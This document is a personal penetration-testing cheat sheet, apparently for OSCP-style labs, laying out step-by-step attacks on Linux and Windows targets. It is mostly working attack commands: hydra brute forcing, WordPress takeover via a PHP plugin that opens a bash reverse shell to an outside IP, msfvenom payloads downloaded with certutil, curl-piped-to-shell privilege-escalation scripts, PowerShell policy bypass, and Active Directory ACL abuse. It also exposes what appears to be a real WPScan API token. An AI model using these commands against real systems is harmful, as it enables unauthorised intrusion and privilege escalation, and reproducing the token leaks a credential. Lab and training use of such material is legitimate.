Updated Nov 8th 2023
Written by Zen as a hedge against performance anxiety when you know what you need to do and just need to hash out the results emotionlessly and instinctively like breathing air.

Optimized for speed on not stealth. This method is EXTREMELY LOUD on networks and has a near GUARANTEE to get the user IP blocked or even globally blacklisted
# Prep

Framework assumes the pentester is using the latest version of Kali. A bare-metal OS works best to prevent driver issues with GPU in case of needing to password crack.

Confirm docker is installed and set rustscan as an alias or add to bashrc / fish config due to it being able to scan all ports and services in 10 seconds
```sh
alias rustscan='sudo docker run -it --rm --name rustscan rustscan/rustscan:2.1.1 -a'
```
# OS Agnostic

Target IP either given or discovered via
```sh
netdiscover
```

set up a directory for the target and enter it

```sh
mkdir Target1-192.168.x.x
cd Target1-192.168.x.x
```

## Recon
Start with a quick open port scan
```sh
rustscan 192.168.x.x
```

Follow up with a service scan on those open ports
```sh
nmap -sC -sV -p21,22,80,3306 -v -T5 192.168.x.x -oN Target#Services.nmap
```

### Web Server(s) 80,443,8080
If web server start run the following
```sh
dirb http://192.168.x.x
```

```sh
dirbuster
```
	wordlist is in /usr/share/wordlists/dirtbuster/directory-list-2.3-medium

open up `burpsuite` and run a browser to check out the web servers for saving and reviewing the web request history easily.
### Samba / SMB 445
run nmap scripts for smb services which enumerates shares and checks for eternal blue
```sh
nmap -Pn -p445 -T5 --script=smb-vuln-ms17-010,smb-enum-shares,smb-enum-users,smb-enum-domains,smb-brute --open 192.168.x.x -v -oN smbScripts.nmap
```
## Weaponize
### FTP Servers
Smash it with a hydra
```
hydra -C /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt 192.168.x.x ftp
```
### Web Servers
If web login form simultaneously run hydra
```sh
hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.x.x http-post-form "/admin/login.php:username=^USER^&password=^PASS^:User name or password incorrect"
```
	Change the path of /admin/login.php to whatever you find in burp's request history. The error message in the final : delimited colums also needs to be changed as well to match what is found.

If wordpress then run wpscan and enumerate 
```
wpscan --url http://192.168.x.x/wordpress/ -e -t 25 -v  --force --api-token Sy5tZcHbYUJyHJbw6TbZBNqiyIO9copNXdF6Zkzh3cg -o WPScan.txt
```

If Users are found from enumeration "-e" then crack their logins

```
wpscan --url http://192.168.x.x/wordpress/ -t 20 -v  --force -U admin,user1,user2 -P /usr/share/wordlists/rockyou.txt
```

Once logged in then add in pentest monkey's reverse shell php code into the theme editor on one of the pages
![[Pasted image 20231105103720.png]]

Or upload the reverse shell plugin as a zip file
https://sevenlayers.com/index.php/179-wordpress-plugin-reverse-shell
```
<?php

/**
* Plugin Name: Reverse Shell Plugin
* Plugin URI:
* Description: Reverse Shell Plugin
* Version: 1.0
* Author: Vince Matteo
* Author URI: http://www.sevenlayers.com
*/

exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.86.99/443 0>&1'");
?>
```
### Samba
Non Metasploit Eternal Blue Exploit
https://github.com/3ndG4me/AutoBlue-MS17-010/blob/master/README.md

## Access
MySQL has a specific way of accessing it since you need -p but type the password later
```sh
mysql --host=192.168.x.x --port=3306 --user=USERNAME -p
```

Or use GUI based `dbeaver`
# Linux Targets

## Access
Prep a nc listener

```sh
nc -nlvp 4444
```

Confirm ip address
```sh
hostname -I
```

Add IP and port to the reverse shell builder
https://www.revshells.com/

### Post Access

Check username & ID
```sh
whoami && id
```

Upgrade the shell for something more stable
```sh
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Search for `local.txt`
```sh
find / -type f -name "local.txt" 2>/dev/null
```

## Privilege Escalation

### Misconfigurations
If "curl" is present then run linpeas.sh and parse it's contents
```
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
```

No curl then download linpeas.sh from the kali host assuming `wget` is present from the /tmp directory due to write permissions then add executable privileges  
```
cd /tmp
wget http://192.168.x.x/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

#### Set SUID on Escalatable Programs
For manual SUID program checking 
```
find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
```

For SUID programs, check gtfo bins for SUID escalations
https://gtfobins.github.io

![[Pasted image 20231105104203.png]]

#### Sudo Programs in CRONTAB
Check the system level crontab
```
cat /etc/crontab
```

Check programs referenced for modification privileges
```
cd /path/to/cron/referenced/file && ls -alt
```
### Kernel Exploits
No SUID programs then check kernel version and check searchsploit for local privledge escalation vulnerabilities or check linpeas.sh output
```
hostnamectl
```

If hostnamectl isn't available
```
uname -r
```

```
searchsploit #.#.#
```
### Sudo Perms
Check Sudo permissions
```sh
sudo -l
```

From the output see what can be modified or escalated from https://gtfobins.github.io or via systemctl services

Example if `/usr/bin/reboot` has sudo privilege 

```ini
[Unit]
Description=Reverse Shell
After=network-online.target
 
[Service]
Type=simple
WorkingDirectory=/home/USER
ExecStart=/home/USER/reverse.sh
TimeoutSec=30
RestartSec=15s
User=USER
ExecReload=/bin/kill -USR1 $MAINPID
Restart=on-failure
 
[Install]
WantedBy=multi-user.target
```

Then run the privileged command  
```
sudo reboot
```
## Actions On Objectives

Confirm flag hashes were found. root flag is in /root/proof.txt

Also dump the other info as well required

```sh
cat /root/proof.txt
```

```sh
echo " ";echo "uname -a:";uname -a;echo " ";echo "hostname:";hostname;echo " ";echo "id";id;echo " ";echo "ifconfig:";/sbin/ifconfig -a;echo " ";echo "proof:";cat /root/proof.txt 2>/dev/null; cat /Desktop/proof.txt 2>/dev/null;echo " "
```

Submit hashes 

# Windows Targets

## Weaponize
Windows Exploit suggester
https://github.com/AonCyberLabs/Windows-Exploit-Suggester

make payloads with msfvenom
## Access
https://podalirius.net/en/articles/windows-reverse-shells-cheatsheet/


Kerberos Vulns
https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a

Create a windows reverse shell on kali

```sh
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.x.x LPORT=4444 -f exe > payload.exe
```

Serve it with python from the local directory
```sh
python -m http.server 80
```

Download the payload on the target
```powershell
certutil -urlcache -split -f "http://192.168.x.x/payload.exe"
```

Run the reverse shell
```powershell
cmd /c C:\\ftp\\payload.exe
```

Port forward port 80 on target machine to remote attacking machine's port 80 via ssh
```sh
sudo ssh -L 80:192.168.49.131:80 ariah@192.168.131.99
```
## Privilege Escalation

Bypass PowerScript **E**xecution **P**ermission protections
```powershell
powershell -ep bypass
```
### File transfers
https://www.ired.team/offensive-security/defense-evasion/downloading-file-with-certutil

#### Via certutil
```powershell
certutil.exe -urlcache -f http://192.168.x.x/winPEASx64.exe c:/tools/winPEASx64.exe
```

accesschk
```powershell
certutil.exe -urlcache -f http://192.168.x.x/accesschk64.exe c:/tools/accesschk64.exe
```

#### Via Samba shares

Serving the file on kali
```sh
sudo impacket-smbserver TMP /var/www/html/
```

Receiving the file on Windows
```powershell
copy \\192.168.x.x\TMP\winPEASx64.exe .   
```

### Misconfigurations

Download and Run WinPEAS from the releases page and enjoy the show (takes some time)
https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS
https://github.com/carlospolop/PEASS-ng/releases

One liner web download 
```powershell
powershell -ep bypass -Command "Invoke-WebRequest -Uri 'https://github.com/carlospolop/PEASS-ng/releases/download/20231105-d387d97f/winPEASx64.exe' -OutFile 'winPEASx64.exe'"
```

WinPEAS options for speed
        domain               Enumerate domain information
        systeminfo           Search system information
        userinfo             Search user information
        processinfo          Search processes information
        servicesinfo         Search services information
        applicationsinfo     Search installed applications information
        networkinfo          Search network information
        windowscreds         Search windows credentials
        browserinfo          Search browser information
        filesinfo            Search generic files that can contains credentials
        fileanalysis         Search specific files that can contains credentials and for regexes inside files
        eventsinfo           Display interesting events information

1. Insecure Service Properties
2. Unquoted Service Path
3. Weak Registry Permissions
4. Insecure Service Executables
5. DLL Hijacking

Running AccessChk - multi user
```powershell
accesschk64.exe -accepteula -uws "C:\Users"
```

AccessChk - Single User
```powershell
accesschk.exe /accepteula -uwcqv user USERNAME
```
### LDAP

ldapsearch on Kali
```sh
ldapsearch -x -H ldap://192.168.x.x -D "USER@DOMAIN.COM" -w 'PASSWORD' -b DC=DCNAME,DC=COM '(&(objectCategory=User)(samaccountname=*))' samaccountname | grep -i samaccountname
```

### Potato Privilege Escalations
Juice Potato
https://github.com/ohpe/juicy-potato

https://medium.com/r3d-buck3t/impersonating-privileges-with-juicy-potato-e5896b20d505

Rogue Potato is for Windows 10 since juicy got patched

### PowerShell Modules / Scripts
#### PowerSploit - PowerView
Download: https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1
```powershell
Import-Module .\PowerView.ps1
```

To find machines with Admin Access
```powershell
Find-LocalAdminAccess
```


#### PowerSploit - PowerUp
Download: https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1
```powershell
Import-Module .\PowerUp.ps1
```
#### AD-RSAT
https://docs.microsoft.com/en-us/powershell/module/activedirectory/?view=windowsserver2022-ps

Importing the module
```powershell
powershell -ep bypass
Import-Module ActiveDirectory
```
### DLL Hijacking


### Permission Delegation / ACL Attacks

Check for
	- ForceChangePassword: We have the ability to set the user's current password without knowing their current password.
	- AddMembers: We have the ability to add users (including our own account), groups or computers to the target group.
	- GenericAll: We have complete control over the object, including the ability to change the user's password, register an SPN or add an AD object to the target group.
	- GenericWrite: We can update any non-protected parameters of our target object. This could allow us to, for example, update the scriptPath parameter, which would cause a script to execute the next time the user logs on.
	- WriteOwner: We have the ability to update the owner of the target object. We could make ourselves the owner, allowing us to gain additional permissions over the object.
	- WriteDACL: We have the ability to write new ACEs to the target object's DACL. We could, for example, write an ACE that grants our account full control over the target object.
	- AllExtendedRights: We have the ability to perform any action associated with extended AD rights against the target object. This includes, for example, the ability to force change a user's password.

To assist with visualizing the AD network use Bloodhound
#### BloodHound - SharpHound AD Visualizer

1. SharpHound first which gets a zip file
2. Bloodhound to analyze the zip file
	1. Upload the data zip
On Windows
```
certutil -urlcache -split -f "http://192.168.x.x/rbcd.py"
```

```
.\SharpHound.exe -c all
```

On Evil-WinRM via PS
```
upload /usr/lib/bloodhound/resources/app/Collectors/SharpHound.exe
```

```
download 20220110120802_BloodHound.zip
```

On Kali
- As docker
```
sudo docker run -it \	
   -p 7474:7474 \
   -e DISPLAY=unix$DISPLAY \
   -v /tmp/.X11-unix:/tmp/.X11-unix \
   --device=/dev/dri:/dev/dri \
   -v ~/Desktop/bloodhound/data:/data \
   --name bloodhound belane/bloodhound
```

- On system start the console & GUI 
```
sudo neo4j console
```

```
bloodhound --no-sandbox
```

default creds `neo4j:neo4j`
Prompted to change my password so changed to `kali`
